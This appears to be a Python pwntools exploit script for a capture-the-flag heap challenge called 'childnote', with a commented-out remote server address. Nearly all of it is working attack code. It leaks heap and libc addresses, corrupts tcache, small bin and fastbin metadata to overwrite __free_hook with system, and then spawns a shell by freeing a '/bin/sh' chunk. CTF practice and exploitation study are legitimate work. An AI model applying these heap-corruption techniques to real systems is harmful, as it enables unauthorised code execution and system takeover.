from pwn import *

p = process('./childnote')
elf = ELF('./childnote')
libc = elf.libc
#p = remote('140.112.31.97', 30204)

def create(size, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Content : ', content)

def show(index):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))

def edit(index, content):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '4')
    p.sendafter('index : ', str(index))

# fill tcache
for i in range(9):
    create(0x90, p64(0x100)*0x10)
for i in range(2, 9):
    delete(i)

create(0xb0, 'a')   # 9
delete(9)

# make unsorted bin merge
delete(0)
delete(1)

show(3)
heap_base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x10
success(f'heap base = {hex(heap_base)}')
show(0)
unsorted_bin = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = unsorted_bin - 0x1ebbe0
global_max_fast = libc_base + 0x1eeb80
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
success(f'libc base = {hex(libc_base)}')
success(f'global_max_fast = {hex(global_max_fast)}')

create(0xf0, 'a')   # 10

# fill 0x110 tcache
for i in range(7):
    edit(10, b'a'*0x88+p64(0)+p64(0x110)+p64(0x100))
    delete(1)
# fill 0x100 tcache
for i in range(6):
    edit(10, b'a'*0x88+p64(0)+p64(0x100)+p64(0x100))
    delete(1)

edit(10, b'a'*0x88+p64(0)+p64(0x100)+p64(0x100))    # make chunk 1 writable
edit(1, b'a'*0x48+p64(0)+p64(0x101)+p64(unsorted_bin)*2) # overwrite unsorted bin size
create(0x100, 'a')  # 11    make unsorted bin to small bin

edit(1, b'a'*0x48+p64(0)+p64(0x101)+p64(libc_base+0x1ebcd0)+p64(heap_base+0x2b0))
edit(10, b'a'*0x8+p64(0)+p64(0x101)+p64(heap_base+0x390)+p64(global_max_fast-0x10))
create(0xf0, p64(0x100)*0x1d)   # 12    trigger tcache stashing

# make 0x110 to fastbin
edit(10, b'a'*0x88+p64(0)+p64(0x110)+p64(0x100))
edit(1, p64(0x110)*0x12)
delete(1)

# fastbin_reverse_into_tcache
edit(10, b'a'*0x88+p64(0)+p64(0x100)+p64(0))
delete(1)
edit(10, b'a'*0x88+p64(0)+p64(0x100)+p64(heap_base+0x1b))
create(0xf0, 'a')   # 13    get heap_base+0x1b
create(0xf0, b'\x00'*0xd5+p64(system)) # 14 overwrite tcache count to 0 and 0x110's tcache next to system
edit(10, b'a'*0x88+p64(0)+p64(0x110)+p64(free_hook-0x10))
create(0x100, 'a') # 15 triger fastbin reverse into tcache

# trigger free hook
edit(10, b'a'*0x88+p64(0)+p64(0x100)+b'/bin/sh\x00')
delete(1)

p.interactive()